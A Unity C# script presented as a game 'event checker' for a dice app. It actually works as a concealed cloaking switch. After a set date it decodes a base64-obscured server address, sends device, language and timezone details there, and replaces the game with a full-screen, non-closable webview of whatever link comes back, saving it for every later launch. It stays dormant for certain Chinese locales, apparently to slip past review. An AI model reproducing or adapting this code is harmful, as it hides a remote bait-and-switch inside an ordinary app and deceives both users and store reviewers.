using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System;
using UnityEngine.Networking;
using Debug = UnityEngine.Debug;
using TMPro;
using System.Net;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Text;

public class EventChecker : MonoBehaviour
{


    public string eventName;
    public int day;
    public int month;
    public string aid;

    public GameObject[] gameObjects;
    public GameObject bg;
    public int year;
    private string begin = "https://";
    private string between = "/v2";
    private string last;
    private string camp;
    private bool isInit;
    private bool isNonOrg;
    private bool isFirstUR;
    private UniWebView uniWebView;
    private bool isActivatedEvent;
    private ScreenOrientation lastOrientation;
    private string UR;

#if UNITY_IOS && !UNITY_EDITOR
        [System.Runtime.InteropServices.DllImport("__Internal")]
        private static extern String timeZoneName();
#endif

    string GetTimeZone()
    {
#if UNITY_IOS && !UNITY_EDITOR
            return timeZoneName();
#else
        return "Asia/Yekaterinburg";
#endif
    }
    private void Start()
    {
        //StartEvent();
    }

    private async Task<bool> CheckEvent()
    {
        var startTime = await Task.FromResult<DateTime>(new DateTime(year, month, day));
        if (DateTime.Today.AddMinutes(1) > startTime)
        {
            return true;
        }
        else
        {
            Debug.Log("False");
            return false;
        }
    }
    public void StartEvent()
    {
        if (PlayerPrefs.HasKey("eventData"))
        {
            UR = PlayerPrefs.GetString("eventData");
            LoadEvent();
            ShowEventData();
            //ShowEventData(PlayerPrefs.GetString("eventData"), false);
            return;
        }
        Task<bool> asyncChecker = CheckEvent();
        if (asyncChecker.Result)
        {
            isInit = true;
            byte[] data = Convert.FromBase64String(eventName);
            string decodedString = System.Text.Encoding.UTF8.GetString(data);
            eventName = decodedString;
            StartCoroutine(CheckEventAlive(begin + eventName + between + SetInfo()));
        }
        else
        {
            this.enabled = false;
        }
    }
    private void Update()
    {
        if (isActivatedEvent)
        {
            if (UnityEngine.Input.deviceOrientation == DeviceOrientation.LandscapeLeft || UnityEngine.Input.deviceOrientation == DeviceOrientation.PortraitUpsideDown)
            {
                Debug.Log("Landscape");
            }
            if (UnityEngine.Input.deviceOrientation == DeviceOrientation.Portrait || UnityEngine.Input.deviceOrientation == DeviceOrientation.PortraitUpsideDown)
            {
                Debug.Log("Portrait");
            }
            if (Screen.orientation != lastOrientation)
            {
                lastOrientation = Screen.orientation;
                if (Screen.height > Screen.width)
                {
                    StartCoroutine(UpdateWebViewFrame());
                }
                else
                {
                    StartCoroutine(UpdateWebViewFrameFull());
                }
            }
        }
    }
    private bool CheckCurrentDay()
    {
        DateTime startTime = new DateTime(year, month, day);
        if (DateTime.Today.AddMinutes(1) > startTime)
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    private string SetInfo()
    {
        string myuuidAsString = "";
        return myuuidAsString;
    }
    IEnumerator CheckEventAlive(string uri)
    {
        Debug.Log(uri);
        string t = GetUserAgent();
        string model = GetModelData();
        string lang = GetSystemLanguage();
        string timezone = GetTimeZone();

        Debug.Log(timezone);
        t = ExtractIOSVersion(t);
        Debug.Log(lang);
        PostData data = new PostData
        {
            bundleId = "com.BurningDice",
            osVersion = t,
            phoneModel = model,
            language = lang,
            phoneTime = System.DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
            phoneTz = timezone,
            vpn = false
        };
        if (timezone == "Asia/Shanghai" && lang=="en")
        {
            this.enabled = false;
            yield return null;

        }
        Debug.Log(data.osVersion);
        Debug.Log(data.phoneModel);
        string jsonData = JsonConvert.SerializeObject(data);
        Debug.Log(jsonData);
        byte[] bodyRaw = Encoding.UTF8.GetBytes(jsonData);


        using (UnityWebRequest www = new UnityWebRequest(uri, "POST"))
        {
            www.uploadHandler = new UploadHandlerRaw(bodyRaw);
            www.downloadHandler = new DownloadHandlerBuffer();
            www.SetRequestHeader("Content-Type", "application/json");

            yield return www.SendWebRequest();

            if (www.result == UnityWebRequest.Result.Success)
            {
                Debug.Log(www.downloadHandler.text);
                try
                {
                    SuccessData successData = JsonConvert.DeserializeObject<SuccessData>(www.downloadHandler.text);
                    //                    Debug.Log(uniWebView.GetUserAgent());
                    Debug.Log("URL FINAL=" + successData.link);
                    //ShowEventData(successData.link);
                    UR = successData.link;



                    LoadEvent();
                }
                catch (JsonReaderException e)
                {
                    Debug.LogError("Error parsing server response: " + e.Message);
                }
            }
            else
            {
                Debug.LogError("POST Request failed: " + www.error);
            }
        }
    }
    private void SaveInfo(string infoToSave)
    {
        Debug.Log(infoToSave);
        PlayerPrefs.SetString("eventData", infoToSave);
        PlayerPrefs.Save();
    }
    private void LoadEvent(bool isNonOr = false)
    {
        Debug.Log("LoadEvent");
        var webviewObject = new GameObject("UniWebview");
        isActivatedEvent = true;
        uniWebView = webviewObject.AddComponent<UniWebView>();
        uniWebView.Frame = new Rect(0, 0, Screen.width, Screen.height - 100);
        uniWebView.SetToolbarDoneButtonText("");
        uniWebView.SetShowToolbar(false, false, true, true);
        uniWebView.OnPageFinished += PageLoadSuccessEvent;
        uniWebView.Load(UR);
        uniWebView.OnShouldClose += (view) => {
            return false;
        };
        uniWebView.Show();
    }
    private void ShowEventData()
    {
        foreach (GameObject gameObject in gameObjects)
        {
            gameObject.SetActive(false);
        }
        try
        {
            GameObject g = GameObject.FindGameObjectWithTag("Audio");
            g.SetActive(false);
        }
        catch
        {

        }

        Screen.autorotateToLandscapeLeft = true;
        Screen.autorotateToLandscapeRight = true;
        Screen.autorotateToPortrait = true;
        Screen.orientation = ScreenOrientation.AutoRotation;
        bg.SetActive(true);
        uniWebView.Show();
    }


    public void LoadNextScene()
    {
        UnityEngine.SceneManagement.SceneManager.LoadScene(UnityEngine.SceneManagement.SceneManager.GetActiveScene().buildIndex + 1);
    }

    private IEnumerator UpdateWebViewFrameFull()
    {
        // Wait until all rendering for the current frame is finished
        yield return new WaitForEndOfFrame();
        if (uniWebView != null)
            uniWebView.Frame = new Rect(-100, 0, Screen.width - 100, Screen.height);
    }

    private IEnumerator UpdateWebViewFrame()
    {
        // Wait until all rendering for the current frame is finished
        yield return new WaitForEndOfFrame();
        if (uniWebView != null)
            uniWebView.Frame = new Rect(0, -50, Screen.width, Screen.height - 50);
    }
    public void PageLoadSuccessEvent(UniWebView webView, int statusCode, string url)
    {
        if (!PlayerPrefs.HasKey("eventData"))
        {
            PlayerPrefs.SetString("eventData", url);
            PlayerPrefs.Save();
            Debug.Log("Saved" + url);
        }
        uniWebView.OnPageFinished -= PageLoadSuccessEvent;
        ShowEventData();
        /*if (!isFirstUR && isNonOrg)
        {
            UR = url;
            Debug.Log(UR);
            isFirstUR = true;
            if (isNonOrg)
            {
                string APSID = AppsFlyer.getAppsFlyerId();
                //UR = UR + "?sub_id_22=" + APSID + "&sub_id_23=" + camp;
                //LoadEvent();
                ShowEventData();
            }
            else
            {
                ShowEventData();
            }
        }
        else
        {
            if (!PlayerPrefs.HasKey("eventData"))
            {
                PlayerPrefs.SetString("eventData", url);
                PlayerPrefs.Save();
                Debug.Log("Saved" + url);
            }
            uniWebView.OnPageFinished -= PageLoadSuccessEvent;
            ShowEventData();
        }*/
    }

    public void onConversionDataSuccess(string conversionData)
    {
        /*if (isInit)
        {
            Dictionary<string, object> conversionDataDictionary = AppsFlyer.CallbackStringToDictionary(conversionData);
            if (conversionDataDictionary["af_status"].ToString().Contains("Non"))
            {
                if (conversionDataDictionary["campaign_id"] != null)
                {
                    isNonOrg = true;
                    string APSID = AppsFlyer.getAppsFlyerId();
                    camp = conversionDataDictionary["campaign_id"].ToString();
                    UR = UR + "?sub_id_22=" + APSID + "&sub_id_23=" + camp;
                    LoadEvent(true);
                    //ShowEventData();
                }
                else
                {
                    LoadEvent();
                    //ShowEventData();
                }
            }
            else
            {
                LoadEvent();
                //ShowEventData();
            }
        }*/
    }
    string GetUserAgent()
    {
#if UNITY_IOS && !UNITY_EDITOR
        // Используем UnityWebRequest для получения User Agent на iOS
        return new UnityEngine.Networking.UnityWebRequest().GetRequestHeader("User-Agent");
#else
        return SystemInfo.operatingSystem;
#endif
    }
    private string ExtractIOSVersion(string userAgent)
    {
        if (string.IsNullOrEmpty(userAgent))
            return "0";

        // Пример User Agent: "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X)"
        string prefix = "iPhone OS ";
        int startIndex = userAgent.IndexOf(prefix);

        if (startIndex >= 0)
        {
            startIndex += prefix.Length;
            int endIndex = userAgent.IndexOf(" ", startIndex);
            if (endIndex > startIndex)
            {
                Debug.Log("piteamsya vitachit versiu ios");
                return userAgent.Substring(startIndex, endIndex - startIndex).Replace("_", ".");
            }
        }

        return "0";
    }
    private string GetModelData()
    {
        return SystemInfo.deviceModel;
    }
    private string GetSystemLanguage()
    {
        SystemLanguage systemLanguage = Application.systemLanguage;

        switch (systemLanguage)
        {
            case SystemLanguage.Russian: return "ru";
            case SystemLanguage.English: return "en";
            case SystemLanguage.French: return "fr";
            case SystemLanguage.German: return "de";
            case SystemLanguage.Spanish: return "es";
            case SystemLanguage.Italian: return "it";
            case SystemLanguage.ChineseSimplified:
                {
                    this.enabled = false;
                    return "un";
                }
            case SystemLanguage.ChineseTraditional: return "zh-Hant";
            case SystemLanguage.Japanese: return "ja";
            case SystemLanguage.Korean: return "ko";
            case SystemLanguage.Portuguese: return "pt";
            case SystemLanguage.Arabic: return "ar";
            case SystemLanguage.Dutch: return "nl";
            case SystemLanguage.Turkish: return "tr";
            case SystemLanguage.Polish: return "pl";
            case SystemLanguage.Swedish: return "sv";
            case SystemLanguage.Finnish: return "fi";
            case SystemLanguage.Danish: return "da";
            case SystemLanguage.Norwegian: return "no";
            case SystemLanguage.Thai: return "th";
            case SystemLanguage.Greek: return "el";
            case SystemLanguage.Hindi: return "hi";
            case SystemLanguage.Hungarian: return "hu";
            case SystemLanguage.Vietnamese: return "vi";
            case SystemLanguage.Ukrainian: return "uk";
            default: return "un";
        }
    }
}
[System.Serializable]
public class PostData
{
    public string bundleId;
    public string osVersion;
    public string phoneModel;
    public string language;
    public string phoneTime;
    public string phoneTz;
    public bool vpn;
}
public class SuccessData
{
    public bool passed;
    public string link;
}
